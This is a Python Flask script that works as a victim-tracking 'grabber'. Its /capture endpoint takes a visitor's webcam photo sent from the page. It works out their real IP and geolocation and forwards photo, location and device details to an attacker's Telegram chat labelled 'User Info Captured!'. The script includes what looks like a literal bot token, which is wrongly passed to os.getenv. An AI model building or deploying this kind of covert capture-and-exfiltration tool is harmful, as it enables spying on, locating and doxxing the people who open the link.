from flask import Flask, request, render_template, jsonify
import requests
import telebot
import base64
import os
from dotenv import load_dotenv

load_dotenv()  # Load environment variables from .env

TOKEN = os.getenv("7624517396:AAHZ4UXAQz9t9OemJTKcR1UAM_sHVzkKTf4")
CHAT_ID = os.getenv("@faaaaahhdhdjdnf")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")  # Load the webpage

@app.route("/capture", methods=["POST"])
def capture():
    data = request.json

    # Extract real IP address
    forwarded_ips = request.headers.get("X-Forwarded-For", "")
    user_ip = forwarded_ips.split(",")[0].strip() if forwarded_ips else request.remote_addr

    # Fetch geolocation based on the real IP
    ip_data = requests.get(f"http://ip-api.com/json/{user_ip}").json()

    # Get other details
    photo_data = data.get("photo")  # Get base64-encoded photo
    user_agent = request.headers.get("User-Agent", "Unknown Device")

    # Prepare message
    message = f"\U0001F310 **User Info Captured!**\n\n"
    message += f"\U0001F194 IP: {ip_data.get('query', 'N/A')}\n"
    message += f"\U0001F4CD Location: {ip_data.get('city', 'Unknown')}, {ip_data.get('regionName', 'Unknown')}, {ip_data.get('country', 'Unknown')}\n"
    message += f"\U0001F4F1 Device: {user_agent}\n"

    # Send the message first
    bot.send_message(CHAT_ID, message)

    # Check if there is a photo
    if photo_data:
        try:
            # Decode and save the image
            photo_bytes = base64.b64decode(photo_data.split(",")[1])  # Decode base64
            photo_path = "user_photo.jpg"

            with open(photo_path, "wb") as f:
                f.write(photo_bytes)

            # Send the photo to Telegram
            with open(photo_path, "rb") as photo:
                bot.send_photo(CHAT_ID, photo)

            print("Photo sent successfully!")

        except Exception as e:
            print("Error saving/sending photo:", str(e))

    return jsonify({"message": "Data sent to Telegram"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
